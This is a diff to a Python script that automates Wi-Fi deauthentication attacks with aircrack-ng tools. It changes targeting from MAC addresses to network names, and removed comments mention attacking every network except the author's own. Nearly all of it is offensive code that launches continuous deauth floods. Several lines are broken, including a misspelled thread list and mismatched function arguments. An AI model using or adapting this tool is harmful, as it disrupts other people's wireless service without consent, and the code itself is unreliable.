@@ -39,8 +39,8 @@ def get_nic():
     nic = wlan_code.findall(result)
     return nic
 
-def get_clients(bssid, channel, wifi_name):
-    subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", channel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout==subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+def get_clients(bssid, channel, essid, wifi_name):
+    subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", channel, "--essid", essid, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout==subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
 # set nic to monitor mode
 def set_monitor_mode(con_name):
@@ -123,12 +123,12 @@ def show_WAPs():
             return active_wireless_networks[int(choice)]
         print("(-) Invalid, try again...")
 
-# TODO change this to attack networks not related to WapitiWifi, WapitiLab, Wapiti2000, Wapiti3004 etc.
-def deauth(netw_mac, targ_mac, interface):
-    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", netw_mac, "-c", targ_mac, interface])
+
+def deauth(targ_ssid, interface):
+    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-e", targ_ssid, interface])
 
 # regex stuff
-macAddr_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
+#macAddr_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
 wlan = re.compile("Interface (wlan[0-9]+)")
 
 # check for sudo and create backup
@@ -136,21 +136,25 @@ check_sudo()
 create_backup()
 
 # mac addresses to leave alone
-safe_macAddr = list()
+safe_essid = list()
 
 while True:
-    #TODO change this to open a csv file and append to list
-    print("Enter the MAC Address(es) of the devices you don't want to kick off the network")
-    macs = input("comma seperated list if more than one, ie 00:11:22:33:44:55,11:22:33:44:55:66 : ")
+    essid_csv = input("Enter the file path containing the ESSIDs you don't want to attack: ")
 
+    with open(essid_csv, "r+") as file:
+        safe_essid.append(file.read())
 
-    safe_macAddr = macAddr_regex.findall(macs)
-    safe_macAddr = [mac.upper() for mac in safe_macAddr]
-
-    if len(safe_macAddr) > 0:
+    if len(safe_essid) > 0:
         break
 
-    print("(-) Invalid Mac Address(es)")
+    print("(-) Invalid essids")
+
+    #safe_macAddr = macAddr_regex.findall(macs)
+    #safe_macAddr = [mac.upper() for mac in safe_macAddr]
+
+    #if len(safe_macAddr) > 0:
+    #    break
+    #print("(-) Invalid Mac Address(es)")
 
 netw_con = find_nic()
 if len(netw_con) == 0:
@@ -177,16 +181,14 @@ set_monitor_mode(con_name=wifi_name)
 # Monitor 2.4Ghz & 5Ghz
 start_monitor()
 
-# TODO instead of picking a network choice, we should automate it to attack everything besides our networks.
-""""""
 # Print menu
 wifi_netw_choice = show_WAPs()
 bssid = wifi_netw_choice["BSSID"]
+essid = wifi_netw_choice["ESSID"]
 # strip out all extra white space
 channel = wifi_netw_choice["channel"].strip()
 # run only against network we want to kick clients off
-get_clients(bssid=bssid, channel=channel, wifi_name=wifi_name)
-""""""
+get_clients(bssid=bssid, channel=channel, essid=essid, wifi_name=wifi_name)
 
 # set can only hold unique values
 active_clients = set()
@@ -215,14 +217,14 @@ try:
                             pass
                         else:
                             # add all the active MAC addresses
-                            active_clients.add(r["Station MAC"])
-            print("Station MAC          |")
-            print("_____________________|")
+                            active_clients.add(r["Probed ESSIDs"])
+            print("Probed ESSIDs          |")
+            print("_______________________|")
             for item in active_clients:
                 print(f"{item}")
                 if item not in threads:
                     theads.append(item)
-                    t = threading.Thread(target=deauth, args=[bssid, item, wifi_name], daemon=True)
+                    t = threading.Thread(target=deauth, args=[essid, item, wifi_name], daemon=True)
                     t.start()
 except KeyboardInterrupt:
     print("\nStopping Deauth...")
